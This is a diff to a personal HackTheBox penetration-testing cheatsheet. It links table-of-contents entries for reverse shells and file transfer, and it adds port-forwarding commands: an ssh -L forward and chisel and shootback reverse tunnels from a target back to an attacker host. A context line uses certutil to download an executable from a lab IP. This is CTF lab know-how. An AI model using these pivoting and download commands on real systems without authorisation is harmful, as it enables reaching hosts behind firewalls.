@@ -18,12 +18,12 @@ My personal HackTheBox Cheatsheet from any sources.
   - [LinPEAS](#linpeas)
   - [WinPEAS](#winpeas)
   - [pspy](#pspy)
-- Brute Force (Cracking)
+- [Brute Force (Cracking)](#brute-force-cracking)
   - [JohnTheRipper](#johntheripper)
   - [hashcat](#hashcat)
   - [Hydra](#hydra)
   - [Patator](#patator)
-- Reverse Shell
+- [Reverse Shell](#reverse-shell)
   - [revshell.com](https://www.revshell.com/)
   - [Python](#reverse-shell-python)
   - [PHP](#reverse-shell-php)
@@ -32,19 +32,18 @@ My personal HackTheBox Cheatsheet from any sources.
   - [socat](#reverse-shell-socat)
   - [Metasploit (Payload)](#metasploit-payload)
   - [ysoserial.net (Windows)](https://github.com/pwntester/ysoserial.net)
-- File Transfer
+- [File Transfer](#file-transfer)
   - [wget](#wget)
   - [curl](#curl)
   - [netcat](#netcat)
   - [openssl](#openssl)
   - [PowerShell](#powershell)
   - [certutil](#certutil)
-- Port Forwarding
-  - ssh
-  - chisel
-  - shootback
-  - gost
-  - goproxy
+- [Port Forwarding](#port-forwarding)
+  - [ssh](#ssh)
+  - [chisel](#chisel)
+  - [shootback](#shootback)
+  - [gost](#gost)
 ## Contents
 ### Enumeration
 #### Nmap
@@ -337,4 +336,26 @@ certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
 ```
 ### Port Forwarding
 #### ssh
-TODO
+SSH tunneling, or SSH port forwarding, is a method of transporting arbitrary data over an encrypted SSH connection. SSH tunnels allow connections made to a local port (that is, to a port on your own desktop) to be forwarded to a remote machine via a secure channel.\
+Source: https://www.concordia.ca/ginacody/aits/support/faq/ssh-tunnel.html
+```
+ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
+```
+#### chisel
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang).\
+Source: https://github.com/jpillora/chisel
+```
+local:~$ ./chisel server -p 4444 --reverse
+machine:~$ ./chisel client <LHOST>:4444 R:<LPORT>:<RHOST>:<RPORT>
+```
+You can access machine <RHOST>:<RPORT> from <LHOST>:<LPORT>.
+#### shootback
+shootback is a reverse TCP tunnel let you access target behind NAT or firewall.\
+Source: https://github.com/aploium/shootback
+```
+local:~$ python3 master.py -m <LHOST>:4444 -c 127.0.0.1:<LPORT>
+machine:~$ python3 slaver.py -m <LHOST>:4444 -t <RHOST>:<RPORT>
+```
+#### gost
+A simple security tunnel written in Golang.\
+Source: https://github.com/ginuerzh/gost/blob/master/README_en.md
